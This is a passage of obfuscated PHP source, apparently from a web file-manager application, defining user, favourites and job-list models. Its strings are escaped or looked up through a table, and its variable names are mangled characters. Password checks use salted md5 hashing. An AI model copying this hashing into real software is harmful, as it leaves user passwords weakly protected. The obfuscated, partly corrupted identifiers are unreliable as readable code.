$îĞøÜ­£ =& $_SERVER[ÏÒ Ì„]; $á¬ÕÍã = Model($îĞøÜ­£[1251]); $€‰ƒ¹äı = Model($îĞøÜ­£[2046]); $‡ÛÆØÎ£ = array($îĞøÜ­£[397] => $¬¦‘â—); if ($çğ¨¹®) { $á¬ÕÍã->where($‡ÛÆØÎ£)->setField($îĞøÜ­£[425], 1); $€‰ƒ¹äı->eventRecycle($¬¦‘â—, $îĞøÜ­£[2047]); } else { $Æ·‹×ïö = $á¬ÕÍã->where($‡ÛÆØÎ£)->find(); $ì‰õèÈÄ = $Æ·‹×ïö[$îĞøÜ­£[405]] == $îĞøÜ­£[87]; $Œîß³—Ï = $á¬ÕÍã->fileNameAuto($Æ·‹×ïö[$îĞøÜ­£[492]], $Æ·‹×ïö[$îĞøÜ­£[28]], REPEAT_RENAME_FOLDER, $ì‰õèÈÄ); if ($Œîß³—Ï != $Æ·‹×ïö[$îĞøÜ­£[28]]) { $á¬ÕÍã->rename($¬¦‘â—, $Œîß³—Ï); } $á¬ÕÍã->where($‡ÛÆØÎ£)->setField($îĞøÜ­£[425], 0); $€‰ƒ¹äı->eventRecycle($¬¦‘â—, $îĞøÜ­£[2048]); } } } goto c‰ôÓ’¦—; eØß¤¨è¿: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($¾–ÖÀÓ) { $Ÿ†ª©»À =& $_SERVER[ÏÒ Ì„]; return array($Ÿ†ª©»À[1856] => array(USER_ID, $Ÿ†ª©»À[2171])); } protected function listData() { $úà‰¥ =& $_SERVER[ÏÒ Ì„]; $Â¦‡×ô¼ = array($úà‰¥[1569] => USER_ID, $úà‰¥[477] => 0); $§Õ¶ûÙˆ = $úà‰¥[2172]; $¡²Ÿ„”ğ = $this->field($§Õ¶ûÙˆ)->where($Â¦‡×ô¼)->order($úà‰¥[2173])->select(); return $¡²Ÿ„”ğ ? $¡²Ÿ„”ğ : array(); } protected function resetCache() { } protected function listView() { $·® Æ‚ò =& $_SERVER[ÏÒ Ì„]; $¹®ßÂâæ = $this->listData(); $¶«²Ø¶Ï = array_filter_by_field($¹®ßÂâæ, $·® Æ‚ò[29], $·® Æ‚ò[411]); $±ú‚úŸø = array_to_keyvalue($¶«²Ø¶Ï, $·® Æ‚ò[33], $·® Æ‚ò[76]); if (!$±ú‚úŸø) { return $¹®ßÂâæ; } $û©¦‘« = 2000; $ˆô¢¬Ì„ = array($·® Æ‚ò[412] => array($·® Æ‚ò[413], $±ú‚úŸø)); $ßìòô„ = Model($·® Æ‚ò[822])->listSource($ˆô¢¬Ì„, $û©¦‘«); $ßìòô„ = array_merge($ßìòô„[$·® Æ‚ò[74]], $ßìòô„[$·® Æ‚ò[75]]); $ßìòô„ = array_to_keyvalue($ßìòô„, $·® Æ‚ò[397]); foreach ($¹®ßÂâæ as $ü‘–Û¢ => $ù´Ã–ûæ) { $¥âÇÄ = $ßìòô„[$ù´Ã–ûæ[$·® Æ‚ò[76]]]; $¥âÇÄ = $¥âÇÄ ? $¥âÇÄ : array(); $¹®ßÂâæ[$ü‘–Û¢] = array_merge($¥âÇÄ, $ù´Ã–ûæ); } return $¹®ßÂâæ; } protected function addFav($ªå»§, $½Óü†øı = '', $‘¶•¢äõ = "\x73\157\x75\x72\143\x65") { $Ö¶²Ê¸ =& $_SERVER[ÏÒ Ì„]; $Å¢·ÇÜ = array($Ö¶²Ê¸[1569] => USER_ID, $Ö¶²Ê¸[477] => 0, $Ö¶²Ê¸[417] => $‘¶•¢äõ, $Ö¶²Ê¸[416] => $ªå»§); if ($this->where($Å¢·ÇÜ)->find()) { return !1; } $Å¢·ÇÜ = array($Ö¶²Ê¸[1569] => USER_ID, $Ö¶²Ê¸[477] => 0); $„®Ä€îÔ = $this->where($Å¢·ÇÜ)->max($Ö¶²Ê¸[1769]); if (!$„®Ä€îÔ) { $„®Ä€îÔ = 0; } if (!$½Óü†øı && $‘¶•¢äõ == $Ö¶²Ê¸[411]) { $Ğ‹àÓĞ = Model($Ö¶²Ê¸[1251])->where(array($Ö¶²Ê¸[412] => $ªå»§))->find(); if (!$Ğ‹àÓĞ) { return !1; } $½Óü†øı = $Ğ‹àÓĞ[$Ö¶²Ê¸[28]]; } $½Óü†øı = $this->getAutoName($½Óü†øı); $Àåå²‰¾ = array($Ö¶²Ê¸[1569] => USER_ID, $Ö¶²Ê¸[477] => 0, $Ö¶²Ê¸[415] => $½Óü†øı, $Ö¶²Ê¸[416] => $ªå»§, $Ö¶²Ê¸[417] => $‘¶•¢äõ, $Ö¶²Ê¸[1750] => $„®Ä€îÔ + 1); return $this->add($Àåå²‰¾); } protected function remove($™Š¢’Âİ) { $˜£ÅäŠÕ =& $_SERVER[ÏÒ Ì„]; $©ºõ°—Î = array($˜£ÅäŠÕ[1569] => USER_ID, $˜£ÅäŠÕ[414] => $™Š¢’Âİ); return $this->where($©ºõ°—Î)->delete(); } protected function removeByName($ëí¦š¦ ) { $Ÿ¡šŸÊ =& $_SERVER[ÏÒ Ì„]; $É¤Öî­ = array($Ÿ¡šŸÊ[1569] => USER_ID, $Ÿ¡šŸÊ[415] => $ëí¦š¦ , $Ÿ¡šŸÊ[477] => 0); return $this->where($É¤Öî­)->delete(); } protected function rename($³¤‚ŠÆ², $¹·ëÒùÃ) { $•¸†”ê— =& $_SERVER[ÏÒ Ì„]; if ($³¤‚ŠÆ² == $¹·ëÒùÃ) { return !1; } $Â´¶Šœ¸ = $this->getAutoName($¹·ëÒùÃ); if ($¹·ëÒùÃ != $Â´¶Šœ¸) { return !1; } $­§Ùı÷ = array($•¸†”ê—[1569] => USER_ID, $•¸†”ê—[477] => 0, $•¸†”ê—[28] => $³¤‚ŠÆ²); return $this->where($­§Ùı÷)->save(array($•¸†”ê—[28] => $¹·ëÒùÃ)); } protected function resetSort($ƒº¹Ã›™) { $ÑäµœüÇ =& $_SERVER[ÏÒ Ì„]; $ƒº¹Ã›™ = is_array($ƒº¹Ã›™) ? $ƒº¹Ã›™ : array(); $ìÂ×ˆ¶¾ = array($ÑäµœüÇ[1569] => USER_ID); for ($ÒÀâÂœµ = 0; $ÒÀâÂœµ < count($ƒº¹Ã›™); $ÒÀâÂœµ++) { $ìÂ×ˆ¶¾[$ÑäµœüÇ[414]] = $ƒº¹Ã›™[$ÒÀâÂœµ]; $this->where($ìÂ×ˆ¶¾)->save(array($ÑäµœüÇ[1750] => $ÒÀâÂœµ + 1)); } return !0; } protected function moveTop($‰€¹¶½¯) { $·œƒƒ¸ú =& $_SERVER[ÏÒ Ì„]; $î™…·çŒ = array($·œƒƒ¸ú[1569] => USER_ID, $·œƒƒ¸ú[477] => 0); $îÈ¹×‹È = $this->where($î™…·çŒ)->where(array($·œƒƒ¸ú[28] => $‰€¹¶½¯))->find(); if (!$îÈ¹×‹È) { return; } $¥Ì¾şğ = $this->field($·œƒƒ¸ú[395])->where($î™…·çŒ)->order($·œƒƒ¸ú[2173])->select(); $¥Ì¾şğ = array_to_keyvalue($¥Ì¾şğ, $·œƒƒ¸ú[33], $·œƒƒ¸ú[395]); $†ìéœ‹È = $¥Ì¾şğ; $¥Ì¾şğ = array_remove_value($¥Ì¾şğ, $îÈ¹×‹È[$·œƒƒ¸ú[395]]); array_unshift($¥Ì¾şğ, $îÈ¹×‹È[$·œƒƒ¸ú[395]]); return $this->resetSort($¥Ì¾şğ); } protected function moveBottom($¬Èú¬‹º) { $Ù¸¬æ‹ê =& $_SERVER[ÏÒ Ì„]; $ÖÕÀà­Œ = array($Ù¸¬æ‹ê[1569] => USER_ID, $Ù¸¬æ‹ê[477] => 0); $×ã­È¿¯ = $this->where($ÖÕÀà­Œ)->max($Ù¸¬æ‹ê[1769]); $‚Ö†–„Å = array($Ù¸¬æ‹ê[1769] => $×ã­È¿¯ + 1); return $this->where($ÖÕÀà­Œ)->where(array($Ù¸¬æ‹ê[28] => $¬Èú¬‹º))->save($‚Ö†–„Å); } private function getAutoName($Àí©åÔî) { $ˆ°¡³øš =& $_SERVER[ÏÒ Ì„]; $©òª†´Ò = array($ˆ°¡³øš[1569] => USER_ID, $ˆ°¡³øš[477] => 0); $Ÿ†”ä‡Ï = $this->field($ˆ°¡³øš[28])->where($©òª†´Ò)->select(); $Ÿ†”ä‡Ï = array_to_keyvalue($Ÿ†”ä‡Ï, $ˆ°¡³øš[33], $ˆ°¡³øš[28]); if (!$Ÿ†”ä‡Ï || !in_array($Àí©åÔî, $Ÿ†”ä‡Ï)) { return $Àí©åÔî; } for ($•Õ¼øÇÇ = 0; $•Õ¼øÇÇ < count($Ÿ†”ä‡Ï); $•Õ¼øÇÇ++) { if (!in_array($Àí©åÔî . "\50{$•Õ¼øÇÇ}\51", $Ÿ†”ä‡Ï)) { return $Àí©åÔî . "\x28{$•Õ¼øÇÇ}\x29"; } } return $Àí©åÔî . "\50{$•Õ¼øÇÇ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\x6a\x6f\142\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\144\145\163\143", "\163\157\x72\164"); const JOB_KEY = "\163\145\154\x66\x4a\x6f\x62\114\151\x73\164"; public function listData($ËîÅø‡Ä = false, $óìˆ¡ëä = "\x73\157\162\164", $ïü¤°° = false) { return parent::listData($ËîÅø‡Ä, $óìˆ¡ëä, $ïü¤°°); } public function remove($ËüŞÀø¿) { return parent::remove($ËüŞÀø¿); } public function add($Õ°‚À§Å) { $Úßã—¸¥ =& $_SERVER[ÏÒ Ì„]; if ($this->findByName($Õ°‚À§Å[$Úßã—¸¥[28]])) { return !1; } $Õ°‚À§Å[$Úßã—¸¥[1769]] = $this->getSort(); return parent::insert($Õ°‚À§Å); } private function getSort() { $¸ù±õ”Å =& $_SERVER[ÏÒ Ì„]; $ˆæ–±üŸ = parent::listData(); $ ƒÒ”ßº = array_to_keyvalue($ˆæ–±üŸ, $¸ù±õ”Å[33], $¸ù±õ”Å[1769]); return empty($ ƒÒ”ßº) ? 0 : max($ ƒÒ”ßº) + 1; } public function update($Èè«â, $ŒÓÎšõ±) { $½™âº¶“ =& $_SERVER[ÏÒ Ì„]; $ö®ìÑƒø = parent::listData($Èè«â); $âÌşÛ‡„ = $this->findByName($ŒÓÎšõ±[$½™âº¶“[28]]); if (!$ö®ìÑƒø || $âÌşÛ‡„ && $âÌşÛ‡„[$½™âº¶“[395]] != $ö®ìÑƒø[$½™âº¶“[395]]) { return !1; } return parent::update($Èè«â, $ŒÓÎšõ±); } public function setUserJob($€¡ç®×, $şûÂ«¢€) { $´ŞüĞ… =& $_SERVER[ÏÒ Ì„]; if (!is_array($şûÂ«¢€)) { $şûÂ«¢€ = array($şûÂ«¢€); } $¯åÌó¢÷ = parent::listData(); $¤ï Ø¬¹ = array_to_keyvalue($¯åÌó¢÷, $´ŞüĞ…[28]); $–úùØ½Ú = $´ŞüĞ…[376]; foreach ($şûÂ«¢€ as $½øù¿Ë°) { if ($¤ï Ø¬¹[$½øù¿Ë°]) { $–úùØ½Ú .= $¤ï Ø¬¹[$½øù¿Ë°][$´ŞüĞ…[395]] . $´ŞüĞ…[47]; } else { $áÛŸŸĞë = $this->add($½øù¿Ë°); $–úùØ½Ú .= $áÛŸŸĞë . $´ŞüĞ…[47]; } } $–úùØ½Ú = rtrim($–úùØ½Ú, $´ŞüĞ…[47]); Model($´ŞüĞ…[532])->metaSet($€¡ç®×, self::JOB_KEY, $–úùØ½Ú); } public function getUserJob($‘ñ“úİ¿) { $×¦æ÷µ° = Model($_SERVER[ÏÒ Ì„][532])->metaGet($‘ñ“úİ¿); return $this->getUserJobInfo($×¦æ÷µ°[self::JOB_KEY]); } public function getUserJobInfo($œ“àÑå) { $êÄÌ—ù“ =& $_SERVER[ÏÒ Ì„]; $ØéğÒ¶— = explode($êÄÌ—ù“[47], $œ“àÑå); $¾›Áî‰Æ = parent::listData(); $¾›Áî‰Æ = array_remove_key($¾›Áî‰Æ, $êÄÌ—ù“[194]); $¥ëÃŞ¡¾ = array(); foreach ($ØéğÒ¶— as $¦Åë¤ñ¶) { if (isset($¾›Áî‰Æ[$¦Åë¤ñ¶])) { $¥ëÃŞ¡¾[] = $¾›Áî‰Æ[$¦Åë¤ñ¶]; } } return $¥ëÃŞ¡¾; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\x61\x6d\x65" => "\x75\163\x65\162\x5f\155\145\x74\141", "\155\145\164\x61\x46\151\145\154\144" => "\x75\163\145\x72\111\104"); protected $simpleField = "\165\x73\x65\x72\x49\104\x2c\156\151\x63\x6b\116\141\x6d\145\x2c\156\141\x6d\x65\54\141\x76\x61\164\141\x72\54\163\145\x78\54\x73\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¤¯ã’è•) { $©Â××££ =& $_SERVER[ÏÒ Ì„]; $»ğÑãùÁ = $©Â××££[2174]; return array($©Â××££[1823] => array($¤¯ã’è•[0], $»ğÑãùÁ), $©Â××££[1825] => array($¤¯ã’è•[0], $»ğÑãùÁ), $©Â××££[2175] => array($¤¯ã’è•[0], $»ğÑãùÁ)); } protected function getInfo($—ÂÛ³£¥, $ãäÔ¾Ëˆ = false) { $ÚòûîÁ = $this->getInfoSimple($—ÂÛ³£¥); if (!is_array($ÚòûîÁ)) { return array(); } if ($ãäÔ¾Ëˆ) { return $this->_getInfoApply($ÚòûîÁ); } return $this->cacheFunctionGet($_SERVER[ÏÒ Ì„][1827], $—ÂÛ³£¥); } protected function getInfoFull($Â·•¥µÓ, $ÀÍ¼éƒŠ = false) { $åÑşÍó» = $this->getInfoSimple($Â·•¥µÓ); if (!is_array($åÑşÍó»)) { return array(); } if ($ÀÍ¼éƒŠ) { return $this->_getInfoApply($åÑşÍó», !0); } return $this->cacheFunctionGet($_SERVER[ÏÒ Ì„][2176], $Â·•¥µÓ); } private function _getInfoApply($µŒì…Å, $…§½…Ğ« = false) { $ÛïïËÊ  =& $_SERVER[ÏÒ Ì„]; if (!$µŒì…Å) { return $µŒì…Å; } $¥¼´Óíö = md5($ÛïïËÊ [2177] . $µŒì…Å[$ÛïïËÊ [886]] . $ÛïïËÊ [2178] . $µŒì…Å[$ÛïïËÊ [28]]); $µŒì…Å = $this->_listDataApplyItem($µŒì…Å); $ÈøÃ…‡â = Model($ÛïïËÊ [1251])->metaGet($µŒì…Å[$ÛïïËÊ [85]][$ÛïïËÊ [397]]); $µŒì…Å[$ÛïïËÊ [2179]] = $¥¼´Óíö; $µŒì…Å[$ÛïïËÊ [85]][$ÛïïËÊ [2010]] = isset($ÈøÃ…‡â[$ÛïïËÊ [2011]]) ? $ÈøÃ…‡â[$ÛïïËÊ [2011]] : null; if ($…§½…Ğ«) { $µŒì…Å[$ÛïïËÊ [459]] = $this->metaGet($µŒì…Å[$ÛïïËÊ [1578]]); } return $µŒì…Å; } protected function getInfoSimple($µıß£üá, $‚¹–×–ş = false) { $ÜµÄÆ ê =& $_SERVER[ÏÒ Ì„]; if (!$µıß£üá) { return array(); } if ($‚¹–×–ş) { $³â×ºŠÃ = $this->where(array($ÜµÄÆ ê[1578] => intval($µıß£üá)))->find(); if (!is_array($³â×ºŠÃ)) { return array(); } $³â×ºŠÃ[$ÜµÄÆ ê[2180]] = Action($ÜµÄÆ ê[2181])->parseUrl($³â×ºŠÃ[$ÜµÄÆ ê[2180]]); return $³â×ºŠÃ; } return $this->cacheFunctionGet($ÜµÄÆ ê[1828], $µıß£üá); } protected function getInfoSimpleOuter($ìÑéÜŒü) { $†«Šó¯ =& $_SERVER[ÏÒ Ì„]; if (!$ìÑéÜŒü || $ìÑéÜŒü == 0) { return array($†«Šó¯[1578] => $†«Šó¯[191], $†«Šó¯[28] => $†«Šó¯[160] . LNG($†«Šó¯[2182]) . $†«Šó¯[530], $†«Šó¯[2180] => STATIC_PATH . $†«Šó¯[2183]); } $š×ƒÄïß = $this->cacheFunctionGet($†«Šó¯[1828], $ìÑéÜŒü); $ËÌŒçíİ = array_field_key($š×ƒÄïß, explode($†«Šó¯[47], $this->simpleField)); if (!$ËÌŒçíİ) { return array($†«Šó¯[1578] => $†«Šó¯[1118], $†«Šó¯[28] => $†«Šó¯[160] . LNG($†«Šó¯[2184]) . $†«Šó¯[530], $†«Šó¯[2180] => STATIC_PATH . $†«Šó¯[2185]); } $ËÌŒçíİ[$†«Šó¯[2180]] = Action($†«Šó¯[2181])->parseUrl($ËÌŒçíİ[$†«Šó¯[2180]]); return $ËÌŒçíİ; } protected function groupUser($ïÒÎíÅÖ) { } public static function errorLang($¹ÚÇÔ‚”) { $Ï¤ï£®¹ =& $_SERVER[ÏÒ Ì„]; $«§à®€Ü = array(self::ERROR_USER_NOT_EXISTS => $Ï¤ï£®¹[2186], self::ERROR_USER_PASSWORD_ERROR => $Ï¤ï£®¹[2187], self::ERROR_USER_EXIST_NAME => $Ï¤ï£®¹[2188], self::ERROR_USER_EXIST_PHONE => $Ï¤ï£®¹[2189], self::ERROR_USER_EXIST_EMAIL => $Ï¤ï£®¹[2190], self::ERROR_USER_LOGIN_LOCK => $Ï¤ï£®¹[2191], self::ERROR_IP_NOT_ALLOW => $Ï¤ï£®¹[2192], self::ERROR_USER_EXIST_NICKNAME => $Ï¤ï£®¹[2193]); return LNG($«§à®€Ü[$¹ÚÇÔ‚”]); } public function getInfoByMeta($ª–„ˆ–ï, $ü±ÈÕÄÛ) { $îØÌ¢áÎ =& $_SERVER[ÏÒ Ì„]; $ÓÇ‹úü¤ = Model($îØÌ¢áÎ[2194])->where(array($îØÌ¢áÎ[93] => $ª–„ˆ–ï, $îØÌ¢áÎ[372] => $ü±ÈÕÄÛ))->find(); if ($ÓÇ‹úü¤) { return $this->getInfo($ÓÇ‹úü¤[$îØÌ¢áÎ[1578]]); } return !1; } public function userLoginCheck($‰¡âÄµ¾, $êò‡Úç°) { $‹”ú˜¼û =& $_SERVER[ÏÒ Ì„]; $ñ÷™®£Ú = $this->userLoginFind($‰¡âÄµ¾); if (!$ñ÷™®£Ú) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ñ÷™®£Ú[$‹”ú˜¼û[1578]], $êò‡Úç°)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ñ÷™®£Ú[$‹”ú˜¼û[1578]]); } public function userLoginFind($·€‹©˜­) { $ÜÙÅ•Œ =& $_SERVER[ÏÒ Ì„]; $º¿„‹ºó = array($ÜÙÅ•Œ[28] => $·€‹©˜­, $ÜÙÅ•Œ[2014] => $·€‹©˜­, $ÜÙÅ•Œ[303] => $·€‹©˜­, $ÜÙÅ•Œ[2195] => $·€‹©˜­, $ÜÙÅ•Œ[994] => $ÜÙÅ•Œ[996]); if ($this->nickNameRpt()) { unset($º¿„‹ºó[$ÜÙÅ•Œ[2014]]); } return $this->where($º¿„‹ºó)->find(); } public function clearCache($’¬ò±¶¥) { $Ï«ÙÜèş =& $_SERVER[ÏÒ Ì„]; $this->cacheFunctionClear($Ï«ÙÜèş[1827], $’¬ò±¶¥); $this->cacheFunctionClear($Ï«ÙÜèş[1828], $’¬ò±¶¥); $this->cacheFunctionClear($Ï«ÙÜèş[2176], $’¬ò±¶¥); } public function userPasswordCheck($×Åô†÷ş, $¿§ú’Ó¢) { $ã¨˜– =& $_SERVER[ÏÒ Ì„]; $ü¯Œ¡ö = $this->where(array($ã¨˜–[1578] => intval($×Åô†÷ş)))->find(); $‚ˆàñ = $this->metaGet($×Åô†÷ş); $¹É·ŸØÍ = isset($‚ˆàñ[$ã¨˜–[2196]]) ? $‚ˆàñ[$ã¨˜–[2196]] : $ã¨˜–[33]; if (md5($¹É·ŸØÍ . trim($¿§ú’Ó¢)) !== $ü¯Œ¡ö[$ã¨˜–[886]]) { return !1; } return !0; } public function userAdd($ı‘î§ª÷) { $™¸©Äì‹ =& $_SERVER[ÏÒ Ì„]; $è÷·é¶ = array($™¸©Äì‹[415] => $ı‘î§ª÷[$™¸©Äì‹[28]], $™¸©Äì‹[2197] => $ı‘î§ª÷[$™¸©Äì‹[1458]], $™¸©Äì‹[2198] => isset($ı‘î§ª÷[$™¸©Äì‹[303]]) ? $ı‘î§ª÷[$™¸©Äì‹[303]] : $™¸©Äì‹[33], $™¸©Äì‹[2199] => isset($ı‘î§ª÷[$™¸©Äì‹[2195]]) ? $ı‘î§ª÷[$™¸©Äì‹[2195]] : $™¸©Äì‹[33], $™¸©Äì‹[2200] => isset($ı‘î§ª÷[$™¸©Äì‹[2014]]) ? $ı‘î§ª÷[$™¸©Äì‹[2014]] : $ı‘î§ª÷[$™¸©Äì‹[28]], $™¸©Äì‹[2201] => isset($ı‘î§ª÷[$™¸©Äì‹[2180]]) ? $ı‘î§ª÷[$™¸©Äì‹[2180]] : $™¸©Äì‹[33], $™¸©Äì‹[2202] => isset($ı‘î§ª÷[$™¸©Äì‹[2203]]) ? $ı‘î§ª÷[$™¸©Äì‹[2203]] : 1, $™¸©Äì‹[2204] => $ı‘î§ª÷[$™¸©Äì‹[886]], $™¸©Äì‹[1829] => isset($ı‘î§ª÷[$™¸©Äì‹[1732]]) ? $ı‘î§ª÷[$™¸©Äì‹[1732]] : 1024 * 1024 * 20, $™¸©Äì‹[1830] => 0, $™¸©Äì‹[2205] => 0, $™¸©Äì‹[1872] => isset($ı‘î§ª÷[$™¸©Äì‹[740]]) ? $ı‘î§ª÷[$™¸©Äì‹[740]] : 1); if (!empty($ı‘î§ª÷[$™¸©Äì‹[1578]])) { $è÷·é¶[$™¸©Äì‹[1578]] = $ı‘î§ª÷[$™¸©Äì‹[1578]]; } $Ğù¤ş×Ú = $this->_checkExist($ı‘î§ª÷); if ($Ğù¤ş×Ú !== !0) { return $Ğù¤ş×Ú; } $áäšªô» = $this->add($è÷·é¶); $Ğæíœëª = array($™¸©Äì‹[2204] => $è÷·é¶[$™¸©Äì‹[886]], $™¸©Äì‹[2200] => $è÷·é¶[$™¸©Äì‹[2014]]); $this->userEdit($áäšªô», $Ğæíœëª); Model($™¸©Äì‹[1251])->userRootAdd($áäšªô»); return $áäšªô»; } protected function userEditTest($’Ş×“±Ì, $Ì—Ğ££) { return $this->call($_SERVER[ÏÒ Ì„][2206], $’Ş×“±Ì, $Ì—Ğ££); } protected function userEdit($„Šİª›¿, $ë™­Š) { $°•“Ó£« =& $_SERVER[ÏÒ Ì„]; $íÍÜà¶ = $this->getInfoSimple($„Šİª›¿); if (!$íÍÜà¶) { return !1; } $êÆÀ·¤û = $this->_checkExist($ë™­Š, $„Šİª›¿); if ($êÆÀ·¤û !== !0) { return $êÆÀ·¤û; } if (isset($ë™­Š[$°•“Ó£«[886]]) && trim($ë™­Š[$°•“Ó£«[886]]) != $°•“Ó£«[33]) { $Úµ²¡ÀÙ = $this->metaGet($„Šİª›¿); if (empty($Úµ²¡ÀÙ[$°•“Ó£«[2196]])) { $Úµ²¡ÀÙ[$°•“Ó£«[2196]] = rand_string(10); Model($°•“Ó£«[507])->metaSet($„Šİª›¿, $°•“Ó£«[2196], $Úµ²¡ÀÙ[$°•“Ó£«[2196]]); } $ë™­Š[$°•“Ó£«[886]] = md5($Úµ²¡ÀÙ[$°•“Ó£«[2196]] . trim($ë™­Š[$°•“Ó£«[886]])); } else { unset($ë™­Š[$°•“Ó£«[886]]); } $this->where(array($°•“Ó£«[1569] => $„Šİª›¿))->save($ë™­Š); if (isset($ë™­Š[$°•“Ó£«[2014]])) { $this->setNamePinyin($„Šİª›¿, $ë™­Š[$°•“Ó£«[2014]]); } $this->clearCache($„Šİª›¿); return !0; } public function setNamePinyin($ú¿ÎØ, $™£°ÔØÁ = false) { $ˆ¤é¨Â =& $_SERVER[ÏÒ Ì„]; if (!$™£°ÔØÁ) { $å¦ø¤ºå = $this->getInfoSimple($ú¿ÎØ); $™£°ÔØÁ = $å¦ø¤ºå[$ˆ¤é¨Â[2014]] ? $å¦ø¤ºå[$ˆ¤é¨Â[2014]] : $å¦ø¤ºå[$ˆ¤é¨Â[28]]; } $â©ñ·ê§ = Model($ˆ¤é¨Â[532]); if (!Input::check($™£°ÔØÁ, $ˆ¤é¨Â[581])) { return $â©ñ·ê§->metaSet($ú¿ÎØ, array($ˆ¤é¨Â[458] => $ˆ¤é¨Â[33], $ˆ¤é¨Â[457] => $ˆ¤é¨Â[33])); } return $â©ñ·ê§->metaSet($ú¿ÎØ, array($ˆ¤é¨Â[458] => str_replace($ˆ¤é¨Â[50], $ˆ¤é¨Â[33], Pinyin::get($™£°ÔØÁ)), $ˆ¤é¨Â[457] => Pinyin::get($™£°ÔØÁ, $ˆ¤é¨Â[582]))); } private function nickNameRpt() { $…§êîş½ =& $_SERVER[ÏÒ Ì„]; $ôæ³½Ÿü = Model($…§êîş½[760])->get($…§êîş½[2207]); $‚æ¸¦”ˆ = $GLOBALS[$…§êîş½[6]][$…§êîş½[379]][$…§êîş½[2207]]; $…”£¿À» = !is_null($ôæ³½Ÿü) ? $ôæ³½Ÿü : $‚æ¸¦”ˆ; return !!$…”£¿À»; } private function _checkExist($‹‹á®Á, $‹©ÏÕ±É = false) { $çû“õ˜ =& $_SERVER[ÏÒ Ì„]; $¶òã¼á = array($çû“õ˜[28] => UserModel::ERROR_USER_EXIST_NAME, $çû“õ˜[2014] => UserModel::ERROR_USER_EXIST_NICKNAME, $çû“õ˜[303] => UserModel::ERROR_USER_EXIST_EMAIL, $çû“õ˜[2195] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¶òã¼á[$çû“õ˜[2014]]); } $§é¯õµ = $‹©ÏÕ±É ? array($çû“õ˜[1578] => array($çû“õ˜[2208], $‹©ÏÕ±É)) : array(); foreach ($¶òã¼á as $Ÿû¼è¯ => $ºĞˆ©Ï¨) { $ÂÔŞºøÀ = array(); foreach ($¶òã¼á as $Ÿ›É•Ğš => $ÀñçÔå›) { if (isset($‹‹á®Á[$Ÿ›É•Ğš]) && $‹‹á®Á[$Ÿ›É•Ğš]) { $ÂÔŞºøÀ[] = $‹‹á®Á[$Ÿ›É•Ğš]; } } if (!$ÂÔŞºøÀ) { continue; } $Œµİ²‡ = array_merge(array($Ÿû¼è¯ => array($çû“õ˜[7], $ÂÔŞºøÀ)), $§é¯õµ); $øÅşªä = $this->where($Œµİ²‡)->find(); if ($øÅşªä) { return $ºĞˆ©Ï¨; } } return !0; } public function userListInfo($ôæ„‚Ìò) { $ËâÕ¹çÊ =& $_SERVER[ÏÒ Ì„]; $ÜÂ‡¹Ì· = array(); $ôæ„‚Ìò = is_array($ôæ„‚Ìò) ? array_unique($ôæ„‚Ìò) : array(); if (!$ôæ„‚Ìò) { return $ÜÂ‡¹Ì·; } if (count($ôæ„‚Ìò) < 20) { foreach ($ôæ„‚Ìò as $ó×í‡ÌÓ) { $ÜÂ‡¹Ì·[$ó×í‡ÌÓ . $ËâÕ¹çÊ[33]] = $this->getInfoSimpleOuter($ó×í‡ÌÓ); } } else { $‡Ï¦¢çı = array($ËâÕ¹çÊ[1569] => array($ËâÕ¹çÊ[413], $ôæ„‚Ìò)); if (count($ôæ„‚Ìò) == 1) { $‡Ï¦¢çı = array($ËâÕ¹çÊ[1569] => $ôæ„‚Ìò[0]); } $É²ÏÀğë = Model($ËâÕ¹çÊ[507])->field($this->simpleField)->where($‡Ï¦¢çı)->select(); $É²ÏÀğë = array_to_keyvalue($É²ÏÀğë, $ËâÕ¹çÊ[1578]); foreach ($ôæ„‚Ìò as $ó×í‡ÌÓ) { $•§£•€§ = $É²ÏÀğë[$ó×í‡ÌÓ]; if (!$•§£•€§) { $ÜÂ‡¹Ì·[$ó×í‡ÌÓ . $ËâÕ¹çÊ[33]] = $this->getInfoSimpleOuter($ó×í‡ÌÓ); continue; } $•§£•€§[$ËâÕ¹çÊ[2180]] = Action($ËâÕ¹çÊ[2181])->parseUrl($•§£•€§[$ËâÕ¹çÊ[2180]]); $ÜÂ‡¹Ì·[$ó×í‡ÌÓ . $ËâÕ¹çÊ[33]] = $•§£•€§; } } return $ÜÂ‡¹Ì·; } protected function userStatus($ôÆˆ”Èè, $é¹¸ãù¼) { $ÃúªÄŞè = $this->getInfoSimple($ôÆˆ”Èè); if (!$ÃúªÄŞè) { return !1; } $‘ó‰‡ó = array($_SERVER[ÏÒ Ì„][740] => $é¹¸ãù¼); return $this->userEdit($ôÆˆ”Èè, $‘ó‰‡ó); } protected function userRemove($«‰Àş‚) { $Õ–æÉÌç =& $_SERVER[ÏÒ Ì„]; $—¾ü¨ˆ = $this->getInfoSimple($«‰Àş‚); if (!$—¾ü¨ˆ) { return !1; } $­ÆËîå = array($Õ–æÉÌç[1569] => $«‰Àş‚); Model($Õ–æÉÌç[589])->where($­ÆËîå)->delete(); Model($Õ–æÉÌç[2209])->where($­ÆËîå)->delete(); Model($Õ–æÉÌç[1835])->where($­ÆËîå)->delete(); Model($Õ–æÉÌç[2194])->where($­ÆËîå)->delete(); Model($Õ–æÉÌç[2210])->where($­ÆËîå)->delete(); Model($Õ–æÉÌç[2031])->removeUserAll($«‰Àş‚); Model($Õ–æÉÌç[822])->userRootRemove($«‰Àş‚); return $this->where($­ÆËîå)->delete(); } protected function userGroupSet($ìÃï³°¸, $•¸ÍÏ •, $‡ãœ•¼í = array()) { $¼ÀÜ± =& $_SERVER[ÏÒ Ì„]; if 